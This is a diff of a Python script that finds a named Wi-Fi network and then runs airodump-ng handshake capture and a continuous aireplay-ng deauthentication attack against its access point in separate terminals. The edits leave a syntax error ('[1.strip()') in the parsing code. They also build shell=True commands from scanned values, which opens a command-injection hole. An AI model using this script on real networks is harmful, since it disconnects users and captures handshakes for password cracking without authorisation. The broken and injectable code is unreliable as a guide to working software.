@@ -41,7 +41,7 @@ def parse_wifi_data(scan_data, ssid):
                 network_info['Security'] = 'Encrypted' if 'on' in line else 'Open'
             elif 'IE: IEEE' in line:
                 if 'WPA' in line or 'WPA2' in line:
-                    security_type = line.split(':')[1].strip()
+                    security_type = line.split(':')[1.strip()
                     network_info['Security'] = security_type
 
         # Check the last network entry
@@ -53,20 +53,19 @@ def start_monitoring_tools(network_info, interface):
     channel = network_info['Channel']
     mac_address = network_info['MAC Address']
     
+    # Attempt to find a suitable terminal emulator
+    terminal = "xterm"  # Default to xterm for broader compatibility
+
     # Commands to run in new terminal windows
-    airodump_cmd = f"gnome-terminal -- airodump-ng -c {channel} -w hash --bssid {mac_address} {interface}"
-    aireplay_cmd = f"gnome-terminal -- aireplay-ng -0 0 -a {mac_address} {interface}"
+    airodump_cmd = f"{terminal} -e 'bash -c \"airodump-ng -c {channel} -w hash --bssid {mac_address} {interface}; sleep 30\"'"
+    aireplay_cmd = f"{terminal} -e 'bash -c \"aireplay-ng -0 0 -a {mac_address} {interface}; sleep 30\"'"
     
     # Start the commands in separate terminals
-    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
-    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', aireplay_cmd])
-    
-    # Run both commands for 30 seconds
-    time.sleep(30)
+    subprocess.Popen(airodump_cmd, shell=True)
+    subprocess.Popen(aireplay_cmd, shell=True)
 
-    # Find and kill the processes to terminate them after 30 seconds
-    subprocess.run(['pkill', '-f', 'airodump-ng'])
-    subprocess.run(['pkill', '-f', 'aireplay-ng'])
+    # Allow commands to run for 30 seconds before closing terminals automatically
+    time.sleep(35)  # Extra time to ensure that sleep commands inside terminals complete
 
 def main():
     ssid_input = input("Enter the SSID you want to look up: ")
@@ -79,7 +78,7 @@ def main():
             if network_info:
                 start_monitoring_tools(network_info, interface)
                 break
-        time.sleep(2)  # Scan every 2 seconds
+        time.sleep(5)  # Scan every 5 seconds
 
 if __name__ == "__main__":
     main()
